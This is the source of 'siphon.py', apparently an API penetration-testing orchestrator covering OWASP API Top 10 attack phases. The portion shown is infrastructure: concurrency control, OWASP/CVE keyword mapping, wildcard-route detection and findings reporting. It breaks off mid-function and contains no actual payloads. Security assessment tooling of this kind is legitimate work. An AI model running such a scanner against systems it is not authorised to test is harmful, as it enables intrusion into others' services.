#!/usr/bin/env python3
"""
siphon.py — API Penetration Testing Orchestrator

Performs comprehensive API security assessment covering OWASP API
Security Top 10 2023: BOLA, Broken Auth, Mass Assignment, Rate Limiting,
BFLA, SSRF, Misconfiguration, Inventory Management, and JWT attacks.

v1.2.0 additions: XSS, CMDi, CRLF, Path Traversal in injection phase;
sensitive file exposure probe; TLS/SSL analysis; default API credential
testing; wildcard routing detection; API framework fingerprinting.

v1.3.0 additions: Kiterunner, FFUF, Feroxbuster, dirsearch tool integration
in Phase 0 (discovery) and Phase 2 (fuzzing); OWASP API Security Top 10 2023
auto-mapping on all non-INFO findings; CVE enrichment from title keywords;
evidence file capturing via OutputManager.output_path(); Fracture-compatible
output_file field in findings.json; summary.json for Crucible summary panel.

v1.4.0 additions: Wildcard/catch-all detection (ported from Fracture) — Phase 0
skips FFUF/Feroxbuster/dirsearch and Phase 2 skips entirely when wildcard
detected; VantageConsole protocol tokens now emit correct JSON for Crucible
log/status/error storage; fixed Gin framework false-positive on nginx headers.

v1.5.0 additions: ProgressManager checkpoint/resume system (mirrors Fracture
pattern) — checkpoint.json tracks completed phases, _skip() checks both
settings and checkpoint; HTTP method probing on tool-discovered paths (OPTIONS
then per-method fallback); INFO findings for endpoints and HTTP methods not
present in scope/spec file; VantageConsole.status() now emits proper phase
label and detail fields for Crucible Status tab.

Works on Linux, macOS, and Windows.
"""

import sys
import os
import subprocess
import importlib
import importlib.util
import platform
import re
import shutil
import argparse
import json
import csv
import socket
import threading
import signal
import getpass
import tempfile
import hashlib
import base64
import hmac
import struct
import time
import copy
import secrets
import difflib
import statistics
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime, timezone
from pathlib import Path
from urllib.parse import urlparse, urljoin, urlencode, quote

# ── Adaptive concurrency ──────────────────────────────────────────────────────
def _hw_detect():
    """Return (logical_cpu_count, ram_gb) for the local machine."""
    _cpu = os.cpu_count() or 2
    try:
        import psutil as _ps
        _ram_gb = _ps.virtual_memory().total / (1024 ** 3)
    except ImportError:
        _ram_gb = 4.0
    return _cpu, _ram_gb

def _calc_initial_concurrency(cpu, ram_gb):
    """
    Derive a starting concurrency limit from hardware specs.
    Uses 75% of logical CPUs, bounded by RAM (0.25 GB assumed per worker)
    and clamped to [4, 64].
    """
    return min(max(4, int(cpu * 0.75)), max(4, int(ram_gb / 0.25)), 64)

class _AdaptiveSemaphore:
    """Counting semaphore whose limit can be raised or lowered at runtime."""
    def __init__(self, initial):
        self._limit = initial
        self._count = 0
        self._cond  = threading.Condition(threading.Lock())

    def acquire(self, timeout=None):
        with self._cond:
            deadline = (time.monotonic() + timeout) if timeout else None
            while self._count >= self._limit:
                rem = (deadline - time.monotonic()) if deadline else None
                if deadline and rem <= 0:
                    return False
                self._cond.wait(timeout=rem)
            self._count += 1
            return True

    def release(self):
        with self._cond:
            if self._count > 0:
                self._count -= 1
            self._cond.notify_all()

    def set_limit(self, new_limit):
        with self._cond:
            self._limit = max(2, new_limit)
            self._cond.notify_all()

    @property
    def limit(self):
        return self._limit

    def __enter__(self):
        self.acquire()
        return self

    def __exit__(self, *_):
        self.release()

def _start_concurrency_monitor(sem, interval=10):
    """
    Daemon thread: samples CPU/RAM every interval seconds and adjusts sem
    to keep resource pressure below 80%. Requires psutil; no-ops if unavailable.
    """
    try:
        import psutil as _psm
    except ImportError:
        return None
    _base = sem.limit

    def _loop():
        while True:
            try:
                time.sleep(interval)
                _cpu_pct = _psm.cpu_percent(interval=2)
                _mem_pct = _psm.virtual_memory().percent
                _cur     = sem.limit
                if _cpu_pct > 80 or _mem_pct > 80:
                    sem.set_limit(max(2, int(_cur * 0.75)))
                elif _cpu_pct < 50 and _mem_pct < 60:
                    sem.set_limit(min(_base, int(_cur * 1.25)))
            except Exception:
                pass

    _t = threading.Thread(target=_loop, daemon=True, name="si-concurrency-monitor")
    _t.start()
    return _t

_hw_cpu, _hw_ram    = _hw_detect()
_SCAN_CONCURRENCY   = _calc_initial_concurrency(_hw_cpu, _hw_ram)
_SCAN_SEM           = _AdaptiveSemaphore(_SCAN_CONCURRENCY)
# ─────────────────────────────────────────────────────────────────────────────

VERSION = "2.3.5"

# ---------------------------------------------------------------------------
# OWASP API Security Top 10 2023 mapping
# ---------------------------------------------------------------------------

_OWASP_API_TOP10: dict = {
    "API1":  ("API1:2023 - Broken Object Level Authorization",
              "https://owasp.org/API-Security/editions/2023/en/0xa1-broken-object-level-authorization/"),
    "API2":  ("API2:2023 - Broken Authentication",
              "https://owasp.org/API-Security/editions/2023/en/0xa2-broken-authentication/"),
    "API3":  ("API3:2023 - Broken Object Property Level Authorization",
              "https://owasp.org/API-Security/editions/2023/en/0xa3-broken-object-property-level-authorization/"),
    "API4":  ("API4:2023 - Unrestricted Resource Consumption",
              "https://owasp.org/API-Security/editions/2023/en/0xa4-unrestricted-resource-consumption/"),
    "API5":  ("API5:2023 - Broken Function Level Authorization",
              "https://owasp.org/API-Security/editions/2023/en/0xa5-broken-function-level-authorization/"),
    "API6":  ("API6:2023 - Unrestricted Access to Sensitive Business Flows",
              "https://owasp.org/API-Security/editions/2023/en/0xa6-unrestricted-access-to-sensitive-business-flows/"),
    "API7":  ("API7:2023 - Server Side Request Forgery",
              "https://owasp.org/API-Security/editions/2023/en/0xa7-server-side-request-forgery/"),
    "API8":  ("API8:2023 - Security Misconfiguration",
              "https://owasp.org/API-Security/editions/2023/en/0xa8-security-misconfiguration/"),
    "API9":  ("API9:2023 - Improper Inventory Management",
              "https://owasp.org/API-Security/editions/2023/en/0xa9-improper-inventory-management/"),
    "API10": ("API10:2023 - Unsafe Consumption of APIs",
              "https://owasp.org/API-Security/editions/2023/en/0xaa-unsafe-consumption-of-apis/"),
}


def _owasp_api_auto(title: str) -> str:
    """Return the OWASP API Security Top 10 2023 code best matching a finding title."""
    t = (title or "").lower()
    if any(k in t for k in ("ssrf", "server side request forgery", "server-side request forgery",
                             "open redirect")):
        return "API7"
    if any(k in t for k in ("bola", "idor", "broken object level", "insecure direct object",
                             "object level authorization", "cross-user", "cross user")):
        return "API1"
    if any(k in t for k in ("jwt", "authentication", "brute force", "credential", "login",
                             "token", "broken auth", "password", "api key", "default cred",
                             "session fixation", "account lockout", "weak.*auth")):
        return "API2"
    if any(k in t for k in ("mass assignment", "over-posting", "parameter binding",
                             "excessive field", "object property", "excessive data",
                             "data exposure")):
        return "API3"
    if any(k in t for k in ("rate limit", "resource consumption", "throttl",
                             "quota", "burst", "no rate", "unrestricted resource")):
        return "API4"
    if any(k in t for k in ("bfla", "function level", "admin function",
                             "undocumented.*method", "http method", "privilege escal",
                             "role bypass", "unauthorized method")):
        return "API5"
    if any(k in t for k in ("business flow", "workflow", "sensitive.*flow",
                             "business logic")):
        return "API6"
    if any(k in t for k in ("third.party", "external api", "unsafe consumption",
                             "supply chain")):
        return "API10"
    if any(k in t for k in ("inventory", "undocumented endpoint", "shadow api",
                             "api version", "deprecated api", "exposed.*api",
                             "sensitive file", "env file", "gitconfig", "swagger.*expos",
                             "openapi.*expos", "specification exposed", "spec.*expos",
                             "catch-all", "wildcard routing")):
        return "API9"
    # Default: Security Misconfiguration covers injections, headers, CORS, TLS, framework exposure
    return "API8"


def _owasp_api_resolve(owasp: str, title: str = "") -> tuple:
    """Return (canonical_name, url) for an OWASP API code or auto-detect from title."""
    m = re.match(r'API(\d+)', owasp or "", re.I)
    if m:
        key = f"API{int(m.group(1))}"
        entry = _OWASP_API_TOP10.get(key)
        if entry:
            return entry
    key = _owasp_api_auto(title)
    return _OWASP_API_TOP10.get(key, ("", ""))


def _cve_lookup(title: str) -> str:
    """Return comma-separated CVE IDs for known vulnerability patterns in a finding title."""
    t = (title or "").lower()
    cves: set = set()
    if any(k in t for k in ("jwt", "alg.*none", "none.*alg", "algorithm confusion",
                             "algorithm substitution")):
        cves.update(["CVE-2015-9235", "CVE-2016-10555"])
    if "heartbleed" in t:
        cves.add("CVE-2014-0160")
    if any(k in t for k in ("log4j", "log4shell")):
        cves.add("CVE-2021-44228")
    if "shellshock" in t:
        cves.add("CVE-2014-6271")
    if any(k in t for k in ("spring4shell", "spring rce")):
        cves.add("CVE-2022-22965")
    if "struts" in t:
        cves.add("CVE-2017-5638")
    if any(k in t for k in ("swagger-ui xss", "swagger xss")):
        cves.add("CVE-2019-17495")
    if "poodle" in t:
        cves.add("CVE-2014-3566")
    if "beast" in t:
        cves.add("CVE-2011-3389")
    if "robot" in t:
        cves.add("CVE-2017-13099")
    if "drown" in t:
        cves.add("CVE-2016-0800")
    if "logjam" in t:
        cves.add("CVE-2015-4000")
    if "freak" in t:
        cves.add("CVE-2015-0204")
    if any(k in t for k in ("lucky13", "lucky 13")):
        cves.add("CVE-2013-0169")
    if "sweet32" in t:
        cves.add("CVE-2016-2183")
    if any(k in t for k in ("ccs injection", "openssl ccs")):
        cves.add("CVE-2014-0224")
    if "rc4" in t and ("ssl" in t or "tls" in t or "cipher" in t):
        cves.add("CVE-2013-2566")
    if "sslv2" in t or "ssl 2" in t or "sslv2" in t or "deprecated.*sslv2" in t:
        cves.add("CVE-2016-0800")
    return ",".join(sorted(cves))


# ---------------------------------------------------------------------------
# Wildcard / catch-all detection
# ---------------------------------------------------------------------------
#
# Ported from Fracture: send 3 probes to randomly-generated paths that cannot
# plausibly exist on the target. If all probes agree on status code AND their
# normalised bodies are structurally similar, the server is treating every path
# as valid (wildcard / catch-all behaviour). At least 2 of 3 signals must agree.

_WC_LEN_TOLERANCE    = 0.08   # 8 % body-length difference
_WC_WORD_TOLERANCE   = 0.10   # 10 % word-count difference
_WC_SIMILARITY_RATIO = 0.88   # difflib SequenceMatcher ratio threshold
_WC_SAMPLE_SIZE      = 8192   # bytes fed to SequenceMatcher (cap for O(n²))


def _wc_body_fp(text: str, probe_paths: list) -> dict:
    """Return a multi-signal fingerprint of *text* after stripping injected probe paths."""
    norm = text
    from urllib.parse import quote as _q
    for p in probe_paths:
        if not p:
            continue
        norm = norm.replace(p, "__WC_PROBE__")
        norm = norm.replace(_q(p), "__WC_PROBE__")
        norm = norm.replace(_q(p, safe=""), "__WC_PROBE__")
    sample = norm[:_WC_SAMPLE_SIZE]
    return {
        "hash":   hashlib.md5(sample.encode("utf-8", errors="replace")).hexdigest(),
        "words":  len(norm.split()),
        "lines":  norm.count("\n") + 1,
        "length": len(text),
        "sample": sample,
    }


def _detect_wildcard(base_url: str, sess: "requests.Session",
                     timeout: int = 10) -> "dict | None":
    """Probe *base_url* with three random paths to detect catch-all/wildcard behaviour.

    Returns a baseline dict when wildcard is confirmed, or None when the server
    responds normally (404/410 for nonexistent paths, or probe responses differ).
    """
    base = base_url.rstrip("/")

    probe_paths = [
        f"/{secrets.token_hex(12)}-notfound",
        f"/nonexistent-{secrets.token_hex(8)}/deep/{secrets.token_hex(6)}.html",
        f"/{secrets.token_hex(14)}.php",
    ]

    responses: list = []
    for path in probe_paths:
        try:
            r = sess.get(base + path, timeout=timeout, allow_redirects=False)
            responses.append((path, r))
        except Exception:
            pass

    if len(responses) < 2:
        return None

    statuses = [r.status_code for _, r in responses]
    if len(set(statuses)) != 1:
        return None

    status = statuses[0]

    if status in (404, 410):
        return None

    if status in (301, 302, 303, 307, 308):
        locations = [r.headers.get("Location", "") for _, r in responses]
        if len(set(locations)) == 1 and locations[0]:
            return {
                "status":      status,
                "location":    locations[0],
                "body_len":    0.0,
                "word_count":  0.0,
                "line_count":  0.0,
                "body_hash":   "",
                "sample":      "",
                "probe_paths": probe_paths,
                "redirect":    True,
            }
        return None

    fps = [_wc_body_fp(r.text, probe_paths) for _, r in responses]

    def _ratio_ok(a: float, b: float, tol: float) -> bool:
        mx = max(a, b, 1)
        return abs(a - b) / mx < tol

    votes = 0
    if _ratio_ok(fps[0]["length"], fps[1]["length"], _WC_LEN_TOLERANCE):
        votes += 1
    if _ratio_ok(fps[0]["words"], fps[1]["words"], _WC_WORD_TOLERANCE):
        votes += 1
    sm_ratio = difflib.SequenceMatcher(
        None, fps[0]["sample"], fps[1]["sample"], autojunk=True
    ).ratio()
    if sm_ratio >= _WC_SIMILARITY_RATIO:
        votes += 1

    if votes < 2:
        return None

    lengths = [f["length"] for f in fps]
    words   = [f["words"]  for f in fps]
    lines   = [f["lines"]  for f in fps]
    med_len = statistics.median(lengths)
    rep_idx = min(range(len(fps)), key=lambda i: abs(fps[i]["length"] - med_len))

    return {
        "status":      status,
        "location":    None,
        "body_len":    med_len,
        "word_count":  statistics.median(words),
        "line_count":  statistics.median(lines),
        "body_hash":   fps[rep_idx]["hash"],
        "sample":      fps[rep_idx]["sample"],
        "probe_paths": probe_paths,
        "redirect":    False,
    }


def _is_wildcard_match(r: "requests.Response",
                       baseline: "dict | None") -> bool:
    """Return True when *r* matches the wildcard baseline (i.e. is a false positive)."""
    if baseline is None:
        return False
    if r.status_code != baseline["status"]:
        return False
    if baseline.get("redirect"):
        return r.headers.get("Location", "") == baseline["location"]

    probe_paths = baseline.get("probe_paths", [])
    fp = _wc_body_fp(r.text, probe_paths)

    if fp["hash"] == baseline["body_hash"]:
        return True

    def _ratio_ok(a: float, b: float, tol: float) -> bool:
        mx = max(a, b, 1)
        return abs(a - b) / mx < tol

    votes = 0
    bl = baseline["body_len"]
    if bl > 0:
        if _ratio_ok(fp["length"], bl, _WC_LEN_TOLERANCE):
            votes += 1
    elif fp["length"] < 50:
        votes += 1

    bw = baseline["word_count"]
    if bw > 0:
        if _ratio_ok(fp["words"], bw, _WC_WORD_TOLERANCE):
            votes += 1
    elif fp["words"] < 5:
        votes += 1

    if baseline["sample"]:
        sm_ratio = difflib.SequenceMatcher(
            None, fp["sample"], baseline["sample"], autojunk=True
        ).ratio()
        if sm_ratio >= _WC_SIMILARITY_RATIO:
            votes += 1

    return votes >= 2


def _clients_base() -> Path:
    """Return the OS-appropriate default parent directory for client project folders."""
    system = platform.system()
    if system == "Windows":
        base = Path("C:/clients")
    elif system == "Darwin":
        base = Path("/Users/Shared/clients")
    else:
        base = Path("/clients")
    base.mkdir(parents=True, exist_ok=True)
    return base


def _build_project_dir(client_short: str, start_date: str, tool_name: str) -> Path:
    """
    Build a structured project directory:
      <clients_base>/<client_short>/<year>/<tool_name>/<client_short>_<datetime>/
    """
    slug = re.sub(r'[^\w-]', '_', (client_short or 'client').strip().lower()).strip('_') or 'client'
    year = (start_date[:4] if start_date and len(start_date) >= 4 and start_date[:4].isdigit()
            else datetime.now().strftime('%Y'))
    dt_str = datetime.now().strftime('%Y%m%d_%H%M%S')
    path = _clients_base() / slug / year / tool_name / f"{slug}_{dt_str}"
    path.mkdir(parents=True, exist_ok=True)
    return path


def _write_project_meta(project_dir: Path, tool: str, client_short: str,
                        year: str, version: str) -> None:
    """Write project_meta.json so Flask apps can discover this project."""
    try:
        (project_dir / "project_meta.json").write_text(
            json.dumps({
                "tool":         tool,
                "client_short": client_short,
                "year":         year,
                "created_at":   datetime.now().isoformat(),
                "version":      version,
                "hostname":     socket.gethostname(),
            }, indent=2),
            encoding="utf-8",
        )
    except Exception:
        pass

# ---------------------------------------------------------------------------
# Dependency bootstrap
# ---------------------------------------------------------------------------

_THIRD_PARTY_DEPS = [
    ("requests",  "requests",  "HTTP library for API probing"),
    ("colorama",  "colorama",  "ANSI color output"),
]
_REQUIRED_PKGS = {"requests", "colorama"}


def _is_importable(module_name: str) -> bool:
    return importlib.util.find_spec(module_name) is not None


def _pip_install(package: str) -> bool:
    try:
        result = subprocess.run(
            [sys.executable, "-m", "pip", "install", "--quiet", package],
            capture_output=True, text=True, timeout=120,
        )
        return result.returncode == 0
    except Exception:
        return False


def _ensure_dependencies() -> None:
    missing = [
        (mod, pkg, desc)
        for mod, pkg, desc in _THIRD_PARTY_DEPS
        if not _is_importable(mod)
    ]
    if not missing:
        return
    print("[siphon] Installing missing Python dependencies …")
    for mod, pkg, desc in missing:
        print(f"  pip install {pkg}  ({desc})")
        if not _pip_install(pkg):
            print(f"  [ERROR] Failed to install {pkg}. Run: pip install {pkg}")
            sys.exit(1)
    print("[siphon] Dependencies installed.\n")


_ensure_dependencies()

import requests
import urllib3
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

# Suppress InsecureRequestWarning — siphon intentionally probes self-signed/internal APIs
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

try:
    from colorama import init as _colorama_init, Fore, Style
    _colorama_init(autoreset=True)
    _HAS_COLOR = True
except ImportError:
    _HAS_COLOR = False
    class Fore:  # type: ignore
        RED = GREEN = YELLOW = CYAN = MAGENTA = BLUE = WHITE = ""
    class Style:  # type: ignore
        BRIGHT = DIM = RESET_ALL = ""

# ---------------------------------------------------------------------------
# VantageConsole — protocol bridge when managed by Vantage/Crucible
# ---------------------------------------------------------------------------

_MANAGED = os.environ.get("CRUCIBLE_MANAGED", "0") == "1"


class VantageConsole:
    """Emits structured protocol tokens when run under Crucible."""

    # Protocol tokens
    LOG    = "__CRUCIBLE_LOG__:"
    ERR    = "__CRUCIBLE_ERR__:"
    STATUS = "__CRUCIBLE_STATUS__:"
    PROMPT = "__CRUCIBLE_PROMPT__:"

    # Severity → color mapping
    _SEV_COLOR = {
        "CRITICAL": Fore.RED + Style.BRIGHT,
        "HIGH":     Fore.RED,
        "MEDIUM":   Fore.YELLOW,
        "LOW":      Fore.CYAN,
        "INFO":     Fore.GREEN,
        "DEBUG":    Style.DIM,
    }

    def __init__(self, managed: bool = _MANAGED):
        self.managed = managed
        self._lock = threading.Lock()

    # ------------------------------------------------------------------ raw
    def _emit(self, token: str, text: str) -> None:
        with self._lock:
            sys.stdout.write(f"{token}{text}\n")
            sys.stdout.flush()

    # ------------------------------------------------------------------ public
    def log(self, msg: str, level: str = "INFO") -> None:
        color = self._SEV_COLOR.get(level, "")
        if self.managed:
            entry = {
                "ts":      datetime.now().isoformat(),
                "level":   level,
                "message": msg,
            }
            self._emit(self.LOG, json.dumps(entry))
        else:
            print(f"{color}[{level}]{Style.RESET_ALL} {msg}")

    def err(self, msg: str) -> None:
        if self.managed:
            entry = {
                "ts":       datetime.now().isoformat(),
                "source":   "siphon",
                "tool":     "siphon",
                "message":  msg,
                "detail":   "",
                "category": "",
            }
            with self._lock:
                sys.stderr.write(f"{self.ERR}{json.dumps(entry)}\n")
                sys.stderr.flush()
        else:
            print(f"{Fore.RED}[ERROR]{Style.RESET_ALL} {msg}", file=sys.stderr)

    _PHASE_LABELS: dict = {
        "discovery":      "Discovery",
        "recon":          "Reconnaissance",
        "fuzzing":        "Fuzzing",
        "injection":      "Injection",
        "auth_bypass":    "Auth Bypass",
        "rate_limiting":  "Rate Limiting",
        "mass_assignment":"Mass Assignment",
        "ssrf":           "SSRF",
        "data_exposure":  "Data Exposure",
        "graphql":          "GraphQL",
        "business_flows":   "Business Flows",
        "bola":             "BOLA",
        "bfla":           "BFLA",
        "cross_user":     "Cross-User",
        "session":        "Session",
        "jwt":            "JWT",
        "sensitive_files":    "Sensitive Files",
        "tls":                "TLS",
        "unsafe_consumption": "Unsafe Consumption",
    }

    def status(self, phase: str, state: str, detail: str = "") -> None:
        if self.managed:
            entry = {
                "phase":    phase,
                "label":    self._PHASE_LABELS.get(phase, phase.replace("_", " ").title()),
                "status":   state,
                "detail":   detail,
                "step":     detail,
                "progress": 0,
                "total":    0,
                "ts":       datetime.now().isoformat(),
            }
            self._emit(self.STATUS, json.dumps(entry))
        else:
            icon = {"running": ">>", "done": "OK", "skip": "--", "fail": "!!"}.get(state, "::")
            color = {"running": Fore.CYAN, "done": Fore.GREEN,
                     "skip": Style.DIM, "fail": Fore.RED}.get(state, "")
            print(f"{color}[{icon}]{Style.RESET_ALL} {phase}: {detail}")

    def finding(self, title: str, severity: str, detail: str, evidence: str = "") -> None:
        color = self._SEV_COLOR.get(severity, "")
        if self.managed:
            payload = json.dumps({
                "type": "finding", "title": title,
                "severity": severity, "detail": detail, "evidence": evidence,
            })
            self._emit(self.LOG, payload)
        else:
            print(f"\n{color}[FINDING — {severity}]{Style.RESET_ALL} {title}")
            print(f"  Detail  : {detail}")
            if evidence:
                print(f"  Evidence: {evidence}")

    def prompt(self, question: str, default: str = "") -> str:
        if self.managed:
            self._emit(self.PROMPT, json.dumps({"question": question, "default": default}))
            answer = sys.stdin.readline().strip()
            return answer if answer else default
        else:
            suffix = f" [{default}]" if default else ""
            try:
                answer = input(f"{Fore.CYAN}{question}{suffix}: {Style.RESET_ALL}").strip()
            except (EOFError, KeyboardInterrupt):
                return default
            return answer if answer else default

    def prompt_secret(self, question: str) -> str:
        if self.managed:
            self._emit(self.PROMPT, json.dumps({"question": question, "secret": True}))
            return sys.stdin.readline().strip()
        else:
            try:
                return getpass.getpass(f"{Fore.CYAN}{question}: {Style.RESET_ALL}")
            except (EOFError, KeyboardInterrupt):
                return ""

    def banner(self, text: str) -> None:
        if self.managed:
            self.log(text, "INFO")
        else:
            print(f"{Fore.CYAN}{Style.BRIGHT}{text}{Style.RESET_ALL}")

    def section(self, title: str) -> None:
        bar = "─" * 60
        if self.managed:
            self.log(f"{bar}  {title}  {bar}", "INFO")
        else:
            print(f"\n{Fore.BLUE}{Style.BRIGHT}{bar}\n  {title}\n{bar}{Style.RESET_ALL}")

    def info(self, msg: str) -> None:
        self.log(msg, "INFO")

    def warn(self, msg: str) -> None:
        self.log(msg, "MEDIUM")

    def debug(self, msg: str) -> None:
        if os.environ.get("SIPHON_DEBUG"):
            self.log(msg, "DEBUG")


# Global console instance
con = VantageConsole()


# ---------------------------------------------------------------------------
# ProgressManager — thread-safe progress dots / spinner
# ---------------------------------------------------------------------------

class ProgressManager:
    """Simple threaded spinner / progress indicator."""

    _SPINNER = ["⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"]

    def __init__(self, console: VantageConsole):
        self.con = console
        self._thread: threading.Thread | None = None
        self._stop_evt = threading.Event()
        self._msg = ""
        self._lock = threading.Lock()

    def start(self, msg: str) -> None:
        if self.con.managed:
            self.con.log(f"{msg} …")
            return
        self._stop_evt.clear()
        self._msg = msg
        self._thread = threading.Thread(target=self._spin, daemon=True)
        self._thread.start()

    def update(self, msg: str) -> None:
        with self._lock:
            self._msg = msg

    def stop(self, final: str = "") -> None:
        if self.con.managed:
            if final:
                self.con.log(final)
            return
        self._stop_evt.set()
        if self._thread:
            self._thread.join(timeout=2)
        if final:
            sys.stdout.write(f"\r{' ' * 80}\r{Fore.GREEN}[OK]{Style.RESET_ALL} {final}\n")
        else:
            sys.stdout.write(f"\r{' ' * 80}\r")
        sys.stdout.flush()

    def _spin(self) -> None:
        idx = 0
        while not self._stop_evt.is_set():
            with self._lock:
                msg = self._msg
            frame = self._SPINNER[idx % len(self._SPINNER)]
            sys.stdout.write(f"\r{Fore.CYAN}{frame}{Style.RESET_ALL} {msg} …")
            sys.stdout.flush()
            idx += 1
            time.sleep(0.1)


# ---------------------------------------------------------------------------
# OutputManager — findings catalogue + report writer
# ---------------------------------------------------------------------------

class OutputManager:
    """Accumulates findings and writes JSON/CSV/text reports."""

    SEVERITIES = ["CRITICAL", "HIGH", "MEDIUM", "LOW", "INFO"]

    TOOL_DIRS = [
        "discovery", "recon", "fuzzing", "injection", "auth_bypass",
        "rate_limiting", "mass_assignment", "ssrf", "data_exposure",
        "graphql", "bola", "bfla", "cross_user", "session", "jwt",
        "sensitive_files", "tls",
    ]

    _RE_UNSAFE = re.compile(r'[^\w._-]')

    def __init__(self, project: str):
        self.project = project
        self.out_dir = Path(project)
        self.out_dir.mkdir(parents=True, exist_ok=True)
        self.findings: list[dict] = []
        self._lock = threading.Lock()
        self._start_time = datetime.now(timezone.utc)
        self.findings_json = self.out_dir / "findings.json"
        self._current_accounts: list = []
        self._setup_dirs()
        if not self.findings_json.exists():
            self.findings_json.write_text("[]", encoding="utf-8")

    def _setup_dirs(self) -> None:
        for d in self.TOOL_DIRS:
            (self.out_dir / d).mkdir(exist_ok=True)

    def output_path(self, phase: str, *parts) -> Path:
        """Return a Path for an evidence file under <out_dir>/<phase>/."""
        name = "_".join(str(p) for p in parts)
        name = self._RE_UNSAFE.sub("_", name)
        if not any(name.endswith(ext) for ext in
                   (".txt", ".json", ".html", ".xml", ".csv", ".png", ".jpg", ".log")):
            name += ".txt"
        d = self.out_dir / phase
        d.mkdir(parents=True, exist_ok=True)
        return d / name

    def tool_path(self, toolname: str, filename: str) -> Path:
        """Return a Path for an external tool output under <out_dir>/tools/<toolname>/."""
        d = self.out_dir / "tools" / toolname
        d.mkdir(parents=True, exist_ok=True)
        return d / filename

    # ---------------------------------------------------------------- adding
    def set_auth_context(self, accounts: list) -> None:
        """Set the active auth context for subsequent add_finding calls."""
        self._current_accounts = list(accounts)

    def add_finding(
        self,
        phase: str,
        title: str,
        severity: str,
        url: str,
        detail: str,
        evidence: str = "",
        remediation: str = "",
        extra: dict | None = None,
        output_file: str = "",
        source: str | None = None,
    ) -> dict:
        ts = datetime.now(timezone.utc).isoformat()
        sev_upper = severity.upper()

        # Parse hostname and port from URL
        try:
            _parsed  = urlparse(url)
            hostname = _parsed.hostname or url
            port     = _parsed.port or (443 if _parsed.scheme == "https" else 80)
            service  = _parsed.scheme or "http"
        except Exception:
            hostname = url
            port     = 0
            service  = "http"

        # Extract optional fields from extra dict
        _extra   = extra or {}
        nist     = _extra.get("nist", "")
        command  = _extra.get("command", "")

        # Auto-resolve OWASP API category for non-INFO findings
        if sev_upper != "INFO":
            _owasp_name, _owasp_url = _owasp_api_resolve(_extra.get("owasp", ""), title)
        else:
            _owasp_name, _owasp_url = "", ""

        # Auto-enrich CVEs from title keywords, merge with any explicitly passed CVEs
        _auto_cves = _cve_lookup(title)
        _extra_cves = _extra.get("cves", "")
        _all_cve_parts = [c.strip() for c in (_auto_cves + "," + _extra_cves).split(",")
                          if c.strip()]
        cves = ",".join(sorted(set(_all_cve_parts)))

        # Fracture-compatible entry written to findings.json for Crucible
        fr_entry = {
            "title":           title,
            "datetime":        ts,
            "ip":              url,
            "port":            int(port) if port else 0,
            "hostname":        hostname,
            "risk":            sev_upper,
            "command":         command,
            "description":     detail,
            "output":          evidence,
            "cves":            cves,
            "sources":         source if source is not None else f"siphon-{phase}",
            "service":         service,
            "output_file":     output_file,
            "affected":        url,
            "exploitdb":       False,
            "metasploit":      False,
            "exploit_details": [],
            "owasp":           _owasp_name,
            "owasp_url":       _owasp_url,
            "nist":            nist,
            "remediation":     remediation,
            "accounts":        list(self._current_accounts),
        }

        # Native Siphon entry kept in self.findings for supplementary reports
        native_entry = {
            "id":          len(self.findings) + 1,
            "phase":       phase,
            "title":       title,
            "severity":    sev_upper,
            "url":         url,
            "detail":      detail,
            "evidence":    evidence,
            "remediation": remediation,
            "timestamp":   ts,
        }

        with self._lock:
            self.findings.append(native_entry)

            # Read existing findings.json, dedup by (title, ip, port), atomic write
            try:
                existing_all: list = json.loads(
                    self.findings_json.read_text(encoding="utf-8"))
                if not isinstance(existing_all, list):
                    existing_all = []
            except Exception:
                existing_all = []

            _norm_key = (title.strip().lower(), url.strip(), int(port) if port else 0)
            merged = False
            for ex in existing_all:
                ex_key = (
                    (ex.get("title") or "").strip().lower(),
                    (ex.get("ip") or "").strip(),
                    int(ex.get("port") or 0),
                )
                if ex_key == _norm_key:
                    # Merge output_file paths (comma-separated)
                    if output_file:
                        ex_files = set(f.strip() for f in (ex.get("output_file") or "").split(",") if f.strip())
                        ex_files.add(output_file.strip())
                        ex["output_file"] = ",".join(sorted(ex_files))
                    # Merge CVEs
                    if cves:
                        ex_cves = set(c.strip() for c in (ex.get("cves") or "").split(",") if c.strip())
                        new_cves = set(c.strip() for c in cves.split(",") if c.strip())
                        ex["cves"] = ",".join(sorted(ex_cves | new_cves))
                    # Merge accounts
                    if self._current_accounts:
                        _ex_accts = ex.get("accounts") or []
                        _acct_keys = {(a.get("username", ""), a.get("role", "")) for a in _ex_accts}
                        for _a in self._current_accounts:
                            _k = (_a.get("username", ""), _a.get("role", ""))
                            if _k not in _acct_keys:
                                _ex_accts.append(_a)
                                _acct_keys.add(_k)
                        ex["accounts"] = _ex_accts
                    merged = True
                    break

            if not merged:
                existing_all.append(fr_entry)

            tmp = self.findings_json.with_suffix(".tmp")
            tmp.write_text(json.dumps(existing_all, indent=2), encoding="utf-8")
            tmp.replace(self.findings_json)

        return native_entry

    def count_by_severity(self) -> dict:
        counts = {s: 0 for s in self.SEVERITIES}
        for f in self.findings:
            sev = f.get("severity", "INFO")
            if sev in counts:
                counts[sev] += 1
        return counts

    # ---------------------------------------------------------------- saving
    def write_summary(self) -> None:
        """Write summary.json for Crucible's summary panel."""
        counts = self.count_by_severity()
        elapsed = (datetime.now(timezone.utc) - self._start_time).total_seconds()
        summary = {
            "tool":      "siphon",
            "version":   VERSION,
            "generated": datetime.now(timezone.utc).isoformat(),
            "hostname":  socket.gethostname(),
            "duration":  round(elapsed, 1),
            "total":     len(self.findings),
            "risk_counts": counts,
        }
        try:
            existing_all: list = json.loads(self.findings_json.read_text(encoding="utf-8"))
            summary["findings_count"] = len(existing_all)
        except Exception:
            summary["findings_count"] = len(self.findings)
        tmp = (self.out_dir / "summary.json").with_suffix(".tmp")
        tmp.write_text(json.dumps(summary, indent=2), encoding="utf-8")
        tmp.replace(self.out_dir / "summary.json")

    def save_json(self, filename: str = "siphon_output.json") -> Path:
        path = self.out_dir / filename
        data = {
            "tool": "siphon",
            "version": VERSION,
            "generated": datetime.now(timezone.utc).isoformat(),
            "summary": self.count_by_severity(),
            "findings": self.findings,
        }
        path.write_text(json.dumps(data, indent=2))
        return path

    def save_csv(self, filename: str = "siphon_output.csv") -> Path:
        path = self.out_dir / filename
        fields = ["id", "phase", "title", "severity", "url", "detail",
                  "evidence", "remediation", "timestamp"]
        with path.open("w", newline="") as fh:
